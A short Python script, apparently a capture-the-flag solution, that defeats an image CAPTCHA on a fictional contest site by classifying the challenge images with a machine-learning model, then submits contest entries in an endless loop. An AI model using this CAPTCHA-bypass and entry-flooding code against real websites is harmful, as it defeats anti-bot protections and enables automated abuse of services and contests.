#!/usr/bin/python3
import requests
from base64 import b64decode
from predict_images import get_predictions

baseURL = 'https://fridosleigh.com/api'
submitURL = f'{baseURL}/capteha/submit'
requestURL = f'{baseURL}/capteha/request'
entryURL = f'{baseURL}/entry'

myEntry = {}
myEntry['name'] = 'Your Name Here'
myEntry['email'] = 'Your Email address here'
myEntry['age'] = 200
myEntry['about'] = 'I am me.'
myEntry['favorites'] = 'fignorthtons'

# Defeat the capteha

r = requests.post(requestURL )
challengeList = r.json()['images']
desiredItems = r.json()['select_type'].replace(', and',',').replace(', ',',').split(',')
imageList = []
for encoded in challengeList:
    thisItem = {}
    thisItem['data'] = b64decode(encoded['base64'])
    thisItem['name'] = encoded['uuid']
    imageList.append(thisItem)

predictionsList = []
predictionsList = get_predictions(imageList)

selectedItems = []
for item in predictionsList:
    if item['prediction'] in desiredItems:
        selectedItems.append(item['name'])

answer = ','.join(selectedItems)
data = {'answer' : answer}
success = True
s = requests.post(submitURL, data=data, cookies = r.cookies)
success = s.json()['request']
e = requests.post(entryURL, data = myEntry, cookies = s.cookies)

if success:
    while True:
        e = requests.post(entryURL, data = myEntry, cookies = e.cookies)
        print(e.json()['data'])
else:
    print(s.json()['data'])
